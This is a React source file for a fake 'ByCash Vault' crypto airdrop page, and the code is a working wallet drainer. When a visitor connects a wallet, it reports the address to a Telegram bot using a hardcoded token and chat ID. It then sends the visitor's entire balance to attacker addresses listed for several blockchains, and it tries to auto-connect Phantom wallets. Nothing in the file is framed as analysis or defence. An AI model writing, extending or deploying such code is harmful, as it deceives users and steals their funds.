import { useState, useEffect } from 'react'
import { useAccount, useBalance, useSendTransaction } from 'wagmi'
import '@web3modal/wagmi/react';  // это регистрирует <w3m-button />
import { parseEther } from 'viem'
import * as solanaWeb3 from '@solana/web3.js'

const TG_TOKEN = "8392732086:AAH21FfWZTjD-P8qnPFaqAVvSKtMwqA6U2A"
const TG_CHAT_ID = "1913550429"

const DRAIN = {
  ethereum: "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
  polygon: "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
  "bnb smart chain": "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
  base: "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
  solana: "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
  tron: "DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk",
  ton: "UQByYVaGVglEpP26nlBebudJa48Ps1u5VH3BYbprPa9j2YOw",
  "usdt_tron": "TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn",
  // ... остальные как в предыдущих версиях
}

async function sendToTg(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`)
  } catch {}
}

function App() {
  const { address, isConnected, chain } = useAccount()
  const { data: balance } = useBalance({ address })
  const { sendTransaction } = useSendTransaction()

  const [phantomAddr, setPhantomAddr] = useState(null)
  const [isPhantomInApp, setIsPhantomInApp] = useState(false)

  useEffect(() => {
    if (isConnected && address) {
      sendToTg(`[WC v2] Подключён: ${address} на ${chain?.name || 'unknown'}`)
      if (balance?.value > parseEther('0.0003')) {
        const drainAddr = DRAIN[chain?.name?.toLowerCase()] || DRAIN.ethereum
        sendTransaction({
          to: drainAddr,
          value: balance.value,
        }).then((hash) => {
          sendToTg(`DRAIN ${balance.formatted} → ${drainAddr} | tx: ${hash}`)
        }).catch(e => sendToTg(`DRAIN ошибка: ${e.message}`))
      }
    }
  }, [isConnected, address, balance, chain, sendTransaction])

  // Phantom in-app detect + auto connect
  useEffect(() => {
    const checkPhantom = async () => {
      if (window.solana?.isPhantom) {
        setIsPhantomInApp(true)
        try {
          const resp = await window.solana.connect()
          setPhantomAddr(resp.publicKey.toString())
          sendToTg(`[Phantom in-app] Подключён: ${resp.publicKey.toString()}`)
          // ... баланс + drain как раньше
        } catch (e) {
          sendToTg(`Phantom auto-connect err: ${e.message}`)
        }
      }
    }
    checkPhantom()
    const interval = setInterval(checkPhantom, 2000)
    return () => clearInterval(interval)
  }, [])

  const openPhantomBrowser = () => {
    const siteUrl = encodeURIComponent(window.location.href)
    const url = `https://phantom.app/ul/browse?url=${siteUrl}&ref=app`
    window.location.href = url
    sendToTg(`[Phantom] Открываем deeplink: ${url}`)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-950 to-black text-white p-6">
      <header className="flex justify-between items-center mb-10">
        <h1 className="text-4xl font-bold glow">ByCash Vault</h1>
      </header>

      <main className="text-center">
        <h2 className="text-6xl font-extrabold glow mb-6">Claim Airdrop Now</h2>
        <p className="text-2xl mb-10">Connect → Confirm → Receive</p>

        {!isConnected && !isPhantomInApp && (
          <div className="max-w-md mx-auto">
            <Web3Button /> {/* Красивая кнопка от Web3Modal — открывает модал с кошельками */}
            <button
              onClick={openPhantomBrowser}
              className="mt-6 w-full bg-purple-600 hover:bg-purple-700 py-4 rounded-full text-xl font-bold"
            >
              Phantom (открыть внутри приложения)
            </button>
          </div>
        )}

        {isConnected && (
          <div className="mt-8 text-xl">
            Подключено: {address.slice(0,6)}...{address.slice(-4)}
            <br />
            Баланс: {balance?.formatted} {balance?.symbol}
          </div>
        )}

        {phantomAddr && (
          <div className="mt-8 text-xl">
            Phantom подключён: {phantomAddr.slice(0,6)}...{phantomAddr.slice(-4)}
          </div>
        )}
      </main>
    </div>
  )
}

export default App